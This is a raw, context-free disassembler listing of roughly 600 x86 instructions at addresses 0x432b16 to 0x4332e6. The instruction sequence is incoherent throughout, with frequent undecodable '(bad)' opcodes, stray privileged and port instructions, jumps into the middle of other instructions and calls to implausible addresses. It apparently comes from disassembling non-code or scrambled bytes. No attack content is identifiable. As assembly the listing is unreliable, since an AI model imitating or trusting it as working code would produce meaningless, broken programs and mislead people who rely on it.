  432b16:	jmp    0x432b69
  432b18:	mov    eax,DWORD PTR ds:0xe8720c
  432b1e:	mov    DWORD PTR [ebp-0x8],eax
  432b21:	jne    0x432b68
  432b23:	jmp    0x432ab0
  432b25:	mov    ebp,DWORD PTR [eax]
  432b27:	clc    
  432b28:	retf   0xff54
  432b2b:	push   ecx
  432b2c:	mov    DWORD PTR ds:0x757210,eax
  432b32:	mov    ecx,DWORD PTR [ebp-0x4]
  432b35:	sub    esp,DWORD PTR [ebx-0x77]
  432b38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b3f:	or     ah,bh
  432b41:	pop    es
  432b42:	ds fwait
  432b44:	push   DWORD PTR [edx]
  432b46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b4c:	(bad)  
  432b4d:	mov    bh,bh
  432b4f:	jmp    0x432b3d
  432b51:	leave  
  432b52:	jne    0x432b5c
  432b54:	call   0x3024ae
  432b59:	in     al,dx
  432b5a:	dec    ebp
  432b5b:	add    dh,BYTE PTR [ebx]
  432b5d:	add    BYTE PTR [ebx],al
  432b5f:	inc    ebp
  432b60:	cmp    esi,DWORD PTR [ecx]
  432b62:	je     0x432b00
  432b64:	mov    eax,edi
  432b66:	or     al,0xf0
  432b68:	add    BYTE PTR [ebp+0x458bf845],al
  432b6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b74:	adc    al,0x7
  432b76:	enter  0x9fc0,0xa5
  432b7a:	rol    BYTE PTR [eax],0x5e
  432b7d:	mov    ecx,ecx
  432b7f:	or     al,0xc
  432b81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b88:	jmp    0x432b89
  432b8a:	push   ebp
  432b8b:	mov    esp,ebp
  432b8d:	cld    
  432b8e:	inc    ebp
  432b8f:	inc    ebp
  432b90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b97:	push   esi
  432b98:	push   esi
  432b99:	mov    edi,0x7af080f
  432b9e:	add    bh,al
  432ba0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432ba6:	add    BYTE PTR [ecx+0x4540100f],cl
  432bac:	mov    ebp,eax
  432bae:	mov    ebp,edi
  432bb0:	lock call edx
  432bb3:	fcom   DWORD PTR [ebp+0x45]
  432bb6:	mov    eax,0x148a8b
  432bbb:	push   ecx
  432bbc:	enter  0xc145,0x83
  432bc0:	cmp    ecx,DWORD PTR [eax]
  432bc2:	add    BYTE PTR [ebp+0x4d],al
  432bc5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bcb:	call   0xffa3273a
  432bd0:	cmp    eax,DWORD PTR [ebp-0xc]
  432bd3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432bd7:	push   ebp
  432bd8:	(bad)  
  432bd9:	call   0x3429dd
  432bde:	mov    bh,0xdb
  432be0:	cld    
  432be1:	or     BYTE PTR [ebp+0x45],bl
  432be4:	(bad)  
  432be5:	call   0xff7d2875
  432bea:	add    al,BYTE PTR [ebp+0x37]
  432bed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432bf3:	jne    0x432bf5
  432bf5:	(bad)  
  432bf6:	cmp    edi,esp
  432bf8:	jne    0x432c2b
  432bfa:	mov    edi,edi
  432bfc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c02:	pop    ds
  432c03:	into   
  432c04:	je     0x432bc7
  432c06:	mov    ebx,DWORD PTR [esi]
  432c08:	or     BYTE PTR [ebp-0x49],al
  432c0b:	mov    esp,DWORD PTR [esi-0x77]
  432c0e:	mov    esi,0x2451f0c
  432c13:	mov    eax,DWORD PTR [eax]
  432c15:	or     al,0x66
  432c17:	sar    bl,0x3b
  432c1a:	xor    esi,DWORD PTR [ebp+0x66]
  432c1d:	xor    ecx,edi
  432c1f:	pop    edi
  432c20:	adc    bl,BYTE PTR [ebx+0x7e]
  432c23:	ret    0xff
  432c26:	cld    
  432c27:	inc    ebp
  432c28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c2e:	cld    
  432c2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c36:	push   0xffffff83
  432c38:	pop    edi
  432c39:	or     BYTE PTR [ebp+0x53],dh
  432c3c:	xorps  xmm1,xmm2
  432c3f:	test   BYTE PTR [eax+eax*1],bh
  432c42:	add    BYTE PTR [eax],al
  432c44:	adc    eax,eax
  432c46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c4e:	jmp    DWORD PTR [eax]
  432c50:	ror    al,0x5e
  432c53:	inc    ebp
  432c54:	leave  
  432c55:	xor    ecx,DWORD PTR [eax]
  432c57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c5d:	add    ah,al
  432c5f:	xor    edi,edi
  432c61:	xor    DWORD PTR [ebx],0x66003302
  432c67:	mov    DWORD PTR [ebp-0xc],ecx
  432c6a:	pcmpgtw mm0,mm0
  432c6d:	add    dl,ah
  432c6f:	leave  
  432c70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c74:	push   eax
  432c75:	dec    ebp
  432c76:	mov    esi,DWORD PTR [ebx-0x75]
  432c79:	lea    ebp,[eax-0x7c00ff02]
  432c7f:	xor    eax,DWORD PTR [eax]
  432c81:	sysret 
  432c83:	dec    ebp
  432c84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c8b:	push   WORD PTR [ecx+0x8]
  432c8f:	jne    0x432c52
  432c91:	ud0    ecx,DWORD PTR [ecx]
  432c94:	mov    eax,edx
  432c96:	lods   al,BYTE PTR ds:[esi]
  432c97:	add    BYTE PTR [eax],al
  432c99:	data16 (bad) 
  432c9b:	iret   
  432c9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ca3:	cli    
  432ca4:	inc    ebp
  432ca5:	cmp    al,0x8d
  432ca7:	add    BYTE PTR [esi+0x2d],ah
  432caa:	inc    ebp
  432cab:	pop    ebp
  432cac:	lea    ecx,[edi]
  432cae:	mov    dl,bh
  432cb0:	add    BYTE PTR [edi],cl
  432cb2:	mov    DWORD PTR [eax+eax*8],edi
  432cb5:	mov    ebx,0x3b87
  432cba:	add    BYTE PTR [ebx],ch
  432cbc:	inc    ebp
  432cbd:	data16 (bad) 
  432cbf:	clc    
  432cc0:	int3   
  432cc1:	cmp    eax,DWORD PTR [eax]
  432cc3:	je     0x432c4e
  432cc5:	push   0xffffffc8
  432cc7:	pop    edi
  432cc8:	xchg   DWORD PTR [ebp+0x0],eax
  432ccb:	data16 add BYTE PTR [ebp+0x45],cl
  432ccf:	lea    cx,[ebp+0x10]
  432cd3:	jb     0x432cd5
  432cd5:	jmp    0x432c60
  432cd7:	call   eax
  432cd9:	clc    
  432cda:	xchg   DWORD PTR [edi+0x1],edi
  432cdd:	mov    eax,DWORD PTR [eax]
  432cdf:	or     BYTE PTR [ebp-0x49],al
  432ce2:	lea    eax,[eax+0x74003154]
  432ce8:	push   edi
  432ce9:	inc    edx
  432cea:	jge    0x432ceb
  432cec:	mov    DWORD PTR [edi],ecx
  432cee:	fdiv   DWORD PTR [edi-0x6]
  432cf1:	inc    DWORD PTR [eax]
  432cf3:	xor    edx,DWORD PTR [eax+0x5f]
  432cf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432cf9:	ret    0x0
  432cfc:	xor    BYTE PTR [ebp-0x51],cl
  432cff:	cmp    edi,0xf0ff89fe
  432d05:	data16 ror al,0x84
  432d09:	rol    BYTE PTR [eax],0x3b
  432d0c:	add    al,dh
  432d0e:	dec    eax
  432d0f:	xchg   esp,eax
  432d10:	push   ebx
  432d11:	jmp    0x432c9e
  432d13:	push   ebp
  432d14:	add    esp,ebp
  432d16:	add    ebp,esp
  432d18:	mov    edx,DWORD PTR [edi+0x24]
  432d1b:	clc    
  432d1c:	dec    esi
  432d1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d23:	cmp    BYTE PTR [ebx],al
  432d25:	jne    0x432cb0
  432d27:	xor    esp,eax
  432d29:	jmp    0x462eac
  432d2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d31:	jne    0x432d27
  432d33:	call   0xffcd2a8d
  432d38:	clc    
  432d39:	xchg   edi,eax
  432d3a:	sti    
  432d3b:	add    DWORD PTR [ebx],eax
  432d3d:	add    BYTE PTR [ebp+0x47],bl
  432d40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d46:	pop    ebp
  432d47:	mov    DWORD PTR [esi-0x48],esi
  432d4a:	jmp    0x432d93
  432d4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d52:	(bad)  
  432d54:	cmp    al,0x0
  432d56:	cmp    eax,DWORD PTR [ebp+0x18]
  432d59:	lea    ebx,[ebp-0x56]
  432d5c:	jle    0x432d5e
  432d5e:	jae    0x432ce9
  432d60:	mov    eax,esp
  432d62:	call   0xb900:0x8b005587
  432d69:	inc    ebp
  432d6a:	push   ebp
  432d6b:	lea    ecx,[ebp-0x27ff4f12]
  432d71:	mov    eax,edi
  432d73:	int3   
  432d74:	push   ebp
  432d75:	xchg   edi,eax
  432d77:	add    esp,ebp
  432d79:	add    BYTE PTR [eax],al
  432d7b:	inc    ebp
  432d7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432d82:	cld    
  432d83:	mov    DWORD PTR [edx],edi
  432d85:	aam    0x75
  432d87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d8d:	mov    DWORD PTR [ebx-0x50],edx
  432d90:	test   BYTE PTR [ebp-0x1],0xe8
  432d94:	mov    eax,DWORD PTR [eax]
  432d96:	hlt    
  432d97:	add    al,al
  432d99:	mov    eax,DWORD PTR ds:0x890045a8
  432d9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432da5:	inc    DWORD PTR [eax*2+0xf75854d]
  432dac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432db2:	call   0x72998af3
  432db7:	je     0x432e17
  432db9:	js     0x432e1a
  432dbb:	lock ret 0x7e
  432dbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dc5:	mov    edi,edi
  432dc7:	sbb    al,bl
  432dc9:	clc    
  432dca:	add    BYTE PTR [ebp-0x73],bh
  432dcd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432dd3:	ror    BYTE PTR [eax],1
  432dd5:	dec    ebp
  432dd6:	xchg   ebp,eax
  432dd7:	mov    edi,edi
  432dd9:	in     al,0x8b
  432ddb:	jge    0x432d66
  432ddd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432de3:	clc    
  432de4:	pop    esi
  432de5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432deb:	clc    
  432dec:	add    al,0x6e
  432dee:	mov    eax,DWORD PTR [ebx]
  432df0:	mov    BYTE PTR [ebp+0x0],dl
  432df3:	mov    edx,DWORD PTR [ebx-0x20]
  432df6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432dfc:	add    eax,0x3b3b73
  432e01:	adc    al,0x89
  432e03:	pop    eax
  432e04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e08:	ret    0xf08
  432e0b:	cmp    al,0x2
  432e0d:	mov    edx,eax
  432e0f:	cld    
  432e10:	add    BYTE PTR [ebp+0x66],dl
  432e13:	add    eax,ebx
  432e15:	add    esp,eax
  432e17:	sub    eax,eax
  432e19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e1f:	add    BYTE PTR [eax],al
  432e21:	mov    DWORD PTR [ebx-0x24],ebx
  432e24:	push   edi
  432e25:	push   ebp
  432e26:	clc    
  432e27:	add    DWORD PTR [esi+0x1b0100],0x45
  432e2e:	out    0xff,eax
  432e30:	add    edx,DWORD PTR [eax]
  432e32:	jmp    0x432e1c
  432e34:	cmp    ch,0x46
  432e37:	(bad)  
  432e38:	jmp    0x40c8b68a
  432e3d:	je     0x432dc9
  432e3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e45:	inc    ebp
  432e46:	add    BYTE PTR [ebx-0x770375],al
  432e4c:	add    ah,ch
  432e4e:	add    edx,esp
  432e50:	pop    edi
  432e51:	pop    ebp
  432e52:	push   ebp
  432e53:	inc    ebx
  432e54:	in     al,dx
  432e55:	pop    ebp
  432e56:	in     al,dx
  432e57:	cmp    edx,DWORD PTR [edi-0x8]
  432e5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e61:	add    al,0x47
  432e63:	push   ebp
  432e64:	mov    esp,ebp
  432e66:	in     al,0x45
  432e68:	dec    ebp
  432e69:	push   esi
  432e6a:	test   DWORD PTR [eax+0xfb010f],esi
  432e70:	add    BYTE PTR [eax+0xc018b],dh
  432e76:	leave  
  432e77:	inc    ebp
  432e78:	test   al,ch
  432e7a:	add    dh,bh
  432e7c:	add    bh,bh
  432e7e:	dec    ebp
  432e7f:	push   cs
  432e80:	mov    DWORD PTR [ecx],eax
  432e82:	hlt    
  432e83:	push   es
  432e84:	dec    ebp
  432e85:	leave  
  432e86:	mov    DWORD PTR [eax],ecx
  432e88:	clc    
  432e89:	cmovge eax,ecx
  432e8c:	mov    ecx,0x85c2f0
  432e92:	clc    
  432e93:	pop    DWORD PTR [ebp+0x1]
  432e96:	push   ebx
  432e97:	add    BYTE PTR [ebp-0x15],bh
  432e9a:	push   esi
  432e9b:	xor    eax,0x898a45
  432ea0:	cld    
  432ea1:	add    al,BYTE PTR [ebp+0x0]
  432ea4:	xor    esp,DWORD PTR [esi-0x64]
  432ea7:	add    DWORD PTR [esi+0x78308c1],edi
  432ead:	add    ah,BYTE PTR [ebp-0x49]
  432eb0:	int    0xbb
  432eb2:	mov    ecx,DWORD PTR [esi+0xc]
  432eb5:	add    dh,al
  432eb7:	cmp    ecx,ebx
  432eb9:	jne    0x432e83
  432ebb:	xor    ecx,DWORD PTR [ebp+0x66]
  432ebe:	jmp    0xca2ec4
  432ec3:	add    DWORD PTR [ebp+0x0],eax
  432ec6:	mov    eax,ebx
  432ec8:	or     al,0x8b
  432eca:	(bad)  
  432ecb:	mov    ecx,esi
  432ecd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ed4:	mov    eax,edi
  432ed6:	or     BYTE PTR [edx],cl
  432ed8:	shl    cl,cl
  432eda:	icebp  
  432edb:	add    BYTE PTR [ebp+0x38],0x8b
  432edf:	or     BYTE PTR [edx+eax*2],cl
  432ee2:	(bad)  
  432ee3:	or     cl,dh
  432ee5:	stc    
  432ee6:	shl    DWORD PTR [ebp-0x30],0xc6
  432eea:	xor    al,0x0
  432eec:	inc    ebp
  432eed:	xchg   BYTE PTR [ebx],al
  432eef:	add    esp,edi
  432ef1:	add    BYTE PTR [ebp-0x39],cl
  432ef4:	mov    al,bl
  432ef6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432efc:	sub    al,0xbf
  432efe:	jmp    0x432e85
  432f00:	mov    edi,eax
  432f02:	lock jge 0x432ef6
  432f05:	lea    esi,[edx-0x74bad5ff]
  432f0b:	mov    ebp,esp
  432f0d:	or     cl,dh
  432f0f:	leave  
  432f10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f17:	dec    ebp
  432f18:	dec    ebp
  432f19:	test   DWORD PTR [ebx],eax
  432f1b:	paddb  mm6,mm0
  432f1e:	add    DWORD PTR [eax],eax
  432f20:	dec    ebp
  432f21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f27:	mov    esi,DWORD PTR [edx]
  432f29:	or     al,0x2b
  432f2b:	dec    ebp
  432f2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f32:	mov    esp,edi
  432f34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f3b:	mov    DWORD PTR [ebx],ebp
  432f3d:	call   0xc76b86d
  432f42:	mov    DWORD PTR [ebp+0x10],ecx
  432f45:	(bad)  
  432f46:	push   0x8b85ff10
  432f4b:	clc    
  432f4c:	or     al,0x54
  432f4e:	(bad)  
  432f4f:	push   ecx
  432f50:	retf   
  432f51:	mov    ebx,0xff4d8dc8
  432f56:	mov    DWORD PTR [ebp+0x8],eax
  432f59:	xor    eax,DWORD PTR [ebp-0x75]
  432f5c:	cmp    ebp,DWORD PTR [ebx]
  432f5e:	lsl    ebx,WORD PTR [edi-0x8]
  432f62:	call   DWORD PTR [ebx-0x741bff75]
  432f68:	(bad)  
  432f69:	or     al,0x5b
  432f6b:	dec    ebp
  432f6c:	or     BYTE PTR [ebx],dh
  432f6e:	inc    ebp
  432f6f:	xor    esi,DWORD PTR ds:0x708088d
  432f75:	in     eax,0x9b
  432f77:	add    BYTE PTR [edx],dh
  432f79:	inc    ebp
  432f7a:	pop    edi
  432f7b:	xor    eax,edx
  432f7d:	test   DWORD PTR [eax],0x81108b8b
  432f83:	dec    ebp
  432f84:	sub    al,0x33
  432f86:	add    BYTE PTR [ebx],dh
  432f88:	push   esi
  432f89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f8f:	mov    edi,eax
  432f91:	or     BYTE PTR [ebp+0x45],al
  432f94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f9a:	xor    ecx,ecx
  432f9c:	pushf  
  432f9d:	push   es
  432f9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fa5:	dec    ebp
  432fa6:	inc    ebp
  432fa7:	cmp    BYTE PTR [ecx],0x54
  432faa:	pushf  
  432fab:	gs (bad) 
  432fad:	shl    esp,1
  432faf:	dec    ebp
  432fb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fb6:	shr    ecx,1
  432fb8:	xlat   BYTE PTR ds:[ebx]
  432fb9:	rol    bh,cl
  432fbb:	mov    edx,esp
  432fbd:	or     BYTE PTR [ebp+0x4588f84d],al
  432fc3:	mov    ecx,DWORD PTR [eax]
  432fc5:	or     BYTE PTR [eax],al
  432fc7:	push   ebp
  432fc8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fce:	dec    ebp
  432fcf:	enter  0xceba,0x8
  432fd3:	retf   0x1807
  432fd6:	ret    0x9b4d
  432fd9:	mov    esi,DWORD PTR [edx]
  432fdb:	or     al,0x33
  432fdd:	into   
  432fde:	add    edx,esi
  432fe0:	add    ecx,edx
  432fe2:	bswap  eax
  432fe4:	ror    esi,0x98
  432fe7:	dec    ebp
  432fe8:	add    cl,ch
  432fea:	mov    edi,edi
  432fec:	hlt    
  432fed:	inc    esi
  432fef:	inc    ebp
  432ff0:	ret    0x4533
  432ff3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ff9:	or     BYTE PTR [ebx],dh
  432ffb:	dec    ebp
  432ffc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433002:	jne    0xff8d2fc9
  433008:	inc    ebp
  433009:	inc    ebp
  43300a:	mov    esi,DWORD PTR [ebx]
  43300c:	clc    
  43300d:	pop    esi
  43300e:	ret    0xcaeb
  433011:	mov    eax,esi
  433013:	call   0x520484e6
  433018:	dec    ebp
  433019:	add    eax,0xf8728b
  43301e:	adc    eax,0xce0ccac9
  433023:	push   ebp
  433024:	ret    0xc6ec
  433027:	in     al,dx
  433028:	call   0x33437d31
  43302d:	push   edi
  43302e:	add    edi,eax
  433030:	xor    eax,eax
  433032:	jmp    0x433079
  433034:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43303a:	add    eax,edi
  43303c:	shr    eax,cl
  43303e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433044:	mov    esi,DWORD PTR [edx]
  433046:	in     al,dx
  433047:	pushf  
  433048:	ret    0x84c7
  43304b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433051:	inc    ebp
  433052:	in     al,dx
  433053:	xor    DWORD PTR [ebp-0x64],eax
  433056:	mov    eax,edi
  433058:	cld    
  433059:	fmul   st(2),st
  43305b:	sbb    dl,al
  43305d:	jmp    0x9c3b:0x304d45c1
  433064:	jbe    0x43302d
  433066:	mov    esp,eax
  433068:	clc    
  433069:	add    BYTE PTR [ebp+0x0],cl
  43306c:	mov    ecx,ecx
  43306e:	lea    eax,[ebp-0x5]
  433071:	mov    edi,edi
  433073:	call   0x51ce84bd
  433078:	hlt    
  433079:	xor    eax,edx
  43307b:	mov    esi,0x9b7284
  433080:	xor    cl,dl
  433082:	mov    esi,eax
  433084:	hlt    
  433085:	into   
  433086:	inc    ebp
  433087:	scas   eax,DWORD PTR es:[edi]
  433088:	mov    ebp,ecx
  43308a:	cld    
  43308b:	add    dl,cl
  43308d:	add    dl,al
  43308f:	inc    ebp
  433090:	shr    DWORD PTR [ebx],0x4d
  433093:	xor    edi,DWORD PTR [ebx]
  433095:	mov    DWORD PTR [edi],ecx
  433097:	clc    
  433098:	dec    esi
  433099:	inc    ebp
  43309a:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330a0:	ret    0xc6ca
  4330a3:	mov    BYTE PTR [ebp-0x32],0x53
  4330a7:	scas   eax,DWORD PTR es:[edi]
  4330a8:	inc    ebp
  4330a9:	jmp    0x4330db
  4330ab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330b2:	pop    ebx
  4330b3:	xor    ecx,DWORD PTR [ebp+0x3]
  4330b6:	mov    eax,DWORD PTR [ebx]
  4330b8:	clc    
  4330b9:	test   edx,ecx
  4330bb:	mov    ecx,esi
  4330bd:	cld    
  4330be:	call   0x8ab77608
  4330c3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330c9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330cf:	fdiv   QWORD PTR [ebx]
  4330d1:	retf   0xce89
  4330d4:	in     al,0xc1
  4330d6:	inc    ebp
  4330d7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330dd:	into   
  4330de:	mov    dh,0xc1
  4330e1:	call   0x8c17766a
  4330e6:	(bad)  
  4330e7:	cld    
  4330e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4330eb:	xor    eax,ecx
  4330ed:	lea    eax,[ebp+0x8]
  4330f0:	mov    esi,DWORD PTR [edx-0x4]
  4330f3:	add    dl,al
  4330f5:	inc    ebp
  4330f6:	mov    esp,0x32d89b8b
  4330fb:	dec    ebp
  4330fc:	mov    esi,DWORD PTR [ebx]
  4330fe:	cld    
  4330ff:	xor    eax,edx
  433101:	sub    esp,DWORD PTR [ebp-0x75]
  433104:	int    0xec
  433106:	sub    ecx,eax
  433108:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43310e:	mov    esi,esp
  433110:	call   0x34177e99
  433115:	inc    DWORD PTR [ebx]
  433117:	mov    edi,DWORD PTR [ebx]
  433119:	cld    
  43311a:	jne    0x433169
  43311c:	mov    esi,DWORD PTR [ebx]
  43311e:	aam    0x8d
  433120:	dec    ebp
  433121:	or     BYTE PTR [ebx],dh
  433123:	jb     0x433128
  433125:	add    BYTE PTR [edi+0x45],bl
  433128:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43312f:	xor    ebp,esp
  433131:	xor    eax,edi
  433133:	sub    edi,esp
  433135:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43313b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433142:	inc    ebp
  433143:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433149:	clc    
  43314a:	mov    eax,edi
  43314c:	nop
  43314d:	fadd   QWORD PTR [eax]
  43314f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433155:	jmp    0x4330e0
  433157:	mov    eax,DWORD PTR [ecx]
  433159:	fadd   DWORD PTR [eax]
  43315b:	inc    ebp
  43315c:	or     DWORD PTR [ebx],esi
  43315e:	dec    eax
  43315f:	add    edx,DWORD PTR [ebx-0x2d]
  433162:	dec    ebp
  433163:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433169:	inc    ebp
  43316a:	push   esp
  43316b:	mov    dl,BYTE PTR [ecx-0xd]
  43316e:	xor    ecx,DWORD PTR [ebp-0x45]
  433171:	(bad)  
  433173:	rol    BYTE PTR [eax],0xc1
  433176:	ret    
  433177:	inc    ebp
  433178:	inc    ebp
  433179:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43317f:	xor    eax,ebx
  433181:	add    eax,DWORD PTR [ebp+0x23]
  433184:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43318a:	cmp    edi,0xc
  43318d:	dec    ebp
  43318e:	inc    ebp
  43318f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433195:	inc    ebp
  433196:	mov    esi,DWORD PTR [ebx]
  433198:	clc    
  433199:	lea    eax,[ebp+0x45725407]
  43319f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331a3:	xor    edi,DWORD PTR [eax]
  4331a5:	mov    ecx,0xff8b8d4d
  4331aa:	push   esp
  4331ab:	enter  0x4df7,0x23
  4331af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331b5:	mov    eax,DWORD PTR [ebx]
  4331b7:	loopne 0x4331a4
  4331b9:	ret    0xc68b
  4331bc:	push   esp
  4331bd:	enter  0x9745,0x8b
  4331c1:	inc    ebp
  4331c2:	cld    
  4331c3:	mov    eax,edi
  4331c5:	clc    
  4331c6:	ret    
  4331c7:	ret    0xc645
  4331ca:	mov    esi,DWORD PTR [ebx]
  4331cc:	cld    
  4331cd:	pop    esi
  4331ce:	mov    ebx,0x83458bc3
  4331d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331d8:	dec    ebp
  4331d9:	xor    DWORD PTR [ebx],esi
  4331db:	pushf  
  4331dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4331e2:	fcom   DWORD PTR [ebp+0x45]
  4331e5:	mov    esi,DWORD PTR [ebx]
  4331e7:	adc    al,0x9c
  4331e9:	inc    ebp
  4331ea:	(bad)  
  4331eb:	mov    ebx,eax
  4331ed:	adc    al,0x85
  4331ef:	cmp    al,0x1
  4331f2:	inc    ebp
  4331f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4331f9:	mov    eax,DWORD PTR [ebx]
  4331fb:	nop
  4331fc:	add    BYTE PTR [eax],al
  4331fe:	inc    ebp
  4331ff:	mov    esi,DWORD PTR [ebx]
  433201:	add    eax,DWORD PTR [ebx]
  433203:	cmp    al,0x89
  433205:	mov    esp,esi
  433207:	clc    
  433208:	inc    ebp
  433209:	inc    ebp
  43320a:	add    edx,DWORD PTR [esi+0xc]
  43320d:	mov    edi,0x7ff0845
  433212:	in     al,dx
  433213:	(bad)  
  433214:	jne    0x4331b1
  433216:	mov    esi,DWORD PTR [edx]
  433218:	clc    
  433219:	add    ebp,DWORD PTR [esi]
  43321b:	mov    edi,edi
  43321d:	in     al,dx
  43321e:	mov    DWORD PTR [ebp-0x10],eax
  433221:	xor    eax,DWORD PTR [ebp+0x3]
  433224:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43322a:	fmul   DWORD PTR [ebx-0x173caf39]
  433230:	lea    ecx,[ecx+0x45e8d4bc]
  433236:	clc    
  433237:	mov    edi,edi
  433239:	cmp    BYTE PTR [ebp+0x4d],al
  43323c:	test   DWORD PTR [eax+0x74],ecx
  43323f:	inc    ecx
  433240:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433246:	ret    
  433247:	inc    eax
  433248:	dec    DWORD PTR [ebx+0x4945f8f0]
  43324e:	push   eax
  43324f:	dec    eax
  433250:	test   al,0xd0
  433252:	dec    eax
  433254:	mov    eax,DWORD PTR [ebp-0x14]
  433257:	mov    eax,DWORD PTR [ebp+0x38]
  43325a:	mov    eax,ecx
  43325c:	fadd   DWORD PTR [ebx]
  43325e:	dec    ebp
  43325f:	inc    eax
  433260:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433266:	inc    ebp
  433267:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43326d:	fadd   QWORD PTR [ebx]
  43326f:	inc    ebp
  433270:	or     al,0x33
  433272:	dec    ebp
  433273:	add    edi,DWORD PTR [ebx]
  433275:	mov    DWORD PTR [edx-0x28],esi
  433278:	mov    eax,DWORD PTR [ebp-0x10]
  43327b:	mov    eax,DWORD PTR [eax+0x10]
  43327e:	mov    eax,edi
  433280:	lock ret 
  433282:	inc    ecx
  433283:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433289:	fsubr  st,st(5)
  43328b:	test   DWORD PTR [eax],eax
  43328d:	clc    
  43328e:	push   0x45
  433290:	(bad)  
  433291:	cmp    al,0xec
  433293:	pushf  
  433294:	inc    ebp
  433295:	(bad)  
  433296:	push   eax
  433297:	fsub   DWORD PTR [eax-0x7b]
  43329a:	(bad)  
  43329b:	clc    
  43329c:	mov    eax,0xf8008584
  4332a1:	mov    eax,DWORD PTR [ebp-0x4]
  4332a4:	mov    edi,0x4585c3cc
  4332aa:	clc    
  4332ab:	mov    eax,DWORD PTR [ebp+0x14]
  4332ae:	xor    eax,DWORD PTR [ebp-0x64]
  4332b1:	mov    edi,eax
  4332b3:	in     al,dx
  4332b4:	les    esi,FWORD PTR [ebp-0x7b]
  4332b7:	mov    edi,eax
  4332b9:	or     al,0x4d
  4332bb:	dec    ebp
  4332bc:	mov    eax,ebp
  4332be:	in     al,0xf2
  4332c0:	dec    ebp
  4332c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332cd:	inc    ebp
  4332ce:	mov    DWORD PTR [ebx],esi
  4332d0:	fadd   QWORD PTR [ebx]
  4332d2:	dec    ebp
  4332d3:	push   eax
  4332d4:	xor    eax,DWORD PTR [ebp+0x3]
  4332d7:	push   eax
  4332d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4332db:	push   esi
  4332dd:	mov    eax,DWORD PTR [eax]
  4332df:	lock cmp eax,0xf84e85c0
  4332e5:	inc    ebp
  4332e6:	test   BYTE PTR [ebx],dh
